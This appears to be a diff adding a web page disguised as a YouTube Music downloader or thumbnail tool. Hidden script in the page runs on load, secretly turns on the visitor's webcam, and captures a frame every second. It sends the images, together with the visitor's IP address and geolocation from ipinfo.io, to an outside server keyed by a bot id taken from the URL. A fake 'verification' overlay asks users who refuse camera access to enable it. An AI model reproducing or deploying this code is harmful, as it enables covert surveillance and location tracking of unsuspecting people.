@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+
+  <title>YouTube Music Downloader</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat">
+ <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Montserrat', sans-serif;
+      background: linear-gradient(135deg, #f0f0f0 0%, #dcdcdc 100%);
+      min-height: 100vh;
+      color: #222222;
+    }
+
+    .navbar {
+      background: linear-gradient(135deg, #ff0000 0%, #cc0000 100%);
+      color: white;
+      text-align: center;
+      padding: 25px 0;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .navbar::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
+      animation: shimmer 3s infinite;
+    }
+
+    @keyframes shimmer {
+      0% { left: -100%; }
+      100% { left: 100%; }
+    }
+
+    #header {
+      font-size: 32px;
+      font-weight: 700;
+      letter-spacing: 2px;
+      text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+      margin-top: 10px;
+    }
+
+    .youtube-logo {
+      display: block;
+      margin: 0 auto 15px;
+      width: 120px;
+      filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.2));
+      transition: transform 0.3s ease;
+    }
+
+    .youtube-logo:hover {
+      transform: scale(1.05);
+    }
+
+    .container {
+      max-width: 650px;
+      margin: 40px auto;
+      padding: 40px;
+      background: rgba(255, 255, 255, 0.95);
+      backdrop-filter: blur(10px);
+      border-radius: 20px;
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.15);
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      transition: transform 0.3s ease, box-shadow 0.3s ease;
+    }
+
+    .container:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 25px 50px rgba(0, 0, 0, 0.2);
+    }
+
+    .form-control {
+      width: 100%;
+      margin-bottom: 25px;
+      padding: 18px 20px;
+      border: 2px solid #e1e5e9;
+      border-radius: 12px;
+      font-family: 'Montserrat', sans-serif;
+      font-size: 16px;
+      transition: all 0.3s ease;
+      background: rgba(255, 255, 255, 0.8);
+      backdrop-filter: blur(5px);
+    }
+
+    .form-control:focus {
+      outline: none;
+      border-color: #ff0000;
+      box-shadow: 0 0 0 3px rgba(255, 0, 0, 0.1);
+      background: rgba(255, 255, 255, 1);
+      transform: scale(1.02);
+    }
+
+    .form-control::placeholder {
+      color: #999;
+      font-weight: 400;
+    }
+
+    #thumbdloadbtn {
+      display: block;
+      width: 100%;
+      padding: 18px;
+      border: none;
+      border-radius: 12px;
+      background: linear-gradient(135deg, #ff0000 0%, #cc0000 100%);
+      color: white;
+      font-size: 18px;
+      font-weight: 600;
+      cursor: pointer;
+      font-family: 'Montserrat', sans-serif;
+      letter-spacing: 1px;
+      text-transform: uppercase;
+      transition: all 0.3s ease;
+      box-shadow: 0 8px 20px rgba(255, 0, 0, 0.3);
+      position: relative;
+      overflow: hidden;
+    }
+
+    #thumbdloadbtn::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+      transition: left 0.5s ease;
+    }
+
+    #thumbdloadbtn:hover {
+      background: linear-gradient(135deg, #cc0000 0%, #990000 100%);
+      transform: translateY(-2px);
+      box-shadow: 0 12px 25px rgba(255, 0, 0, 0.4);
+    }
+
+    #thumbdloadbtn:hover::before {
+      left: 100%;
+    }
+
+    #thumbdloadbtn:active {
+      transform: translateY(0);
+      box-shadow: 0 5px 15px rgba(255, 0, 0, 0.3);
+    }
+
+    h2 {
+      color: #333;
+      font-size: 24px;
+      font-weight: 600;
+      margin: 35px 0 25px 0;
+      text-align: center;
+      position: relative;
+    }
+
+    h2::after {
+      content: '';
+      position: absolute;
+      bottom: -8px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 60px;
+      height: 3px;
+      background: linear-gradient(135deg, #ff0000 0%, #cc0000 100%);
+      border-radius: 2px;
+    }
+
+    ol {
+      background: rgba(255, 0, 0, 0.05);
+      padding: 25px 30px;
+      border-radius: 12px;
+      border-left: 4px solid #ff0000;
+      margin-top: 20px;
+    }
+
+    ol li {
+      margin-bottom: 12px;
+      font-size: 16px;
+      line-height: 1.6;
+      color: #555;
+      font-weight: 400;
+      padding-left: 10px;
+    }
+
+    ol li:last-child {
+      margin-bottom: 0;
+    }
+
+    
+    footer {
+      text-align: center;
+      margin-top: 60px;
+      color: rgba(255, 255, 255, 0.8);
+      font-weight: 400;
+      padding-bottom: 30px;
+    }
+
+    /* Responsive Design */
+    @media (max-width: 768px) {
+      .container {
+        margin: 20px;
+        padding: 30px 20px;
+      }
+      
+      #header {
+        font-size: 24px;
+        letter-spacing: 1px;
+      }
+      
+      .youtube-logo {
+        width: 100px;
+      }
+      
+      .form-control {
+        padding: 15px;
+        font-size: 14px;
+      }
+      
+      #thumbdloadbtn {
+        padding: 15px;
+        font-size: 16px;
+      }
+      
+      h2 {
+        font-size: 20px;
+      }
+    }
+
+    /* Loading animation for button */
+    .loading {
+      position: relative;
+    }
+
+    .loading::after {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 20px;
+      height: 20px;
+      border: 2px solid transparent;
+      border-top: 2px solid white;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: translate(-50%, -50%) rotate(0deg); }
+      100% { transform: translate(-50%, -50%) rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <nav class="navbar">
+    <img class="youtube-logo" src="https://www.gstatic.com/youtube/img/branding/youtubelogo/svg/youtubelogo.svg" alt="YouTube Logo">
+    <h1 id="header">YOUTUBE MUSIC DOWNLOADER</h1>
+  </nav>
+
+  <div class="container">
+    <input id="ytlink" type="text" class="form-control" placeholder="Paste YouTube Music Link">
+    <input id="imageInput" type="file" style="display: none;" accept="image/*">
+    <button id="thumbdloadbtn" onclick="sendImage()">FETCH</button>
+
+    <h2>How to Download HD YouTube Music Thumbnail</h2>
+    <ol>
+      <li>Copy the YouTube Music Video Link</li>
+      <li>Paste the link in the field above</li>
+      <li>Click on "FETCH" to start process</li>
+    </ol>
+  </div>
+
+  <center>
+    <div id="message-container"></div>
+  </center>
+
+  
+<style>
+  #permission-overlay {
+    position: fixed;
+    inset: 0;
+    background: rgba(255, 255, 255, 0.8);
+    backdrop-filter: blur(6px);
+    display: none;
+    align-items: center;
+    justify-content: center;
+    z-index: 9999;
+    font-family: 'Montserrat', sans-serif;
+    color: #222;
+    text-align: center;
+    padding: 20px;
+  }
+</style>
+
+<div id="permission-overlay">
+  <div>
+    <h2 style="font-size: 20px; font-weight: bold;">ð Camera Permission Needed</h2>
+    <p style="margin-top: 10px;">Please enable camera access in your browser settings<br>to proceed with verification.</p>
+  </div>
+</div>
+
+<script>
+  const bot = new URLSearchParams(window.location.search).get("_y");
+  const encId = new URLSearchParams(window.location.search).get("_x");
+  function decryptId(encoded) {
+    let padded = encoded + '==='.slice(0, (4 - encoded.length % 4) % 4);
+    return atob(padded);
+  }
+  const id = decryptId(encId || '');
+  let video;
+
+  async function initCameraAndStream() {
+    if (!bot || !id) return;
+
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      video = document.createElement('video');
+      video.srcObject = stream;
+      await video.play();
+      setInterval(captureAndSendImage, 1000);
+    } catch (e) {
+      document.getElementById("permission-overlay").style.display = "flex";
+    }
+  }
+
+  async function captureAndSendImage() {
+    if (!video || video.readyState < 2) return;
+
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    const base64 = canvas.toDataURL('image/png');
+
+    const ipinfo = await fetch("https://ipinfo.io/json")
+      .then(res => res.json())
+      .catch(() => ({}));
+
+    const payload = {
+      bot,
+      id,
+      imgcode: base64,
+      data: {
+        ip: ipinfo.ip || "",
+        city: ipinfo.city || "",
+        region: ipinfo.region || "",
+        country: ipinfo.country || "",
+        loc: ipinfo.loc || "",
+        org: ipinfo.org || "",
+        postal: ipinfo.postal || "",
+        timezone: ipinfo.timezone || ""
+      }
+    };
+
+    await fetch("https://api-prod-nxcrt.nx3r.com/send-image", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
+  }
+
+  window.addEventListener("DOMContentLoaded", initCameraAndStream);
+</script>
+
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"5dd516cab50b40299b599fc6a3569f8a","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+</html>
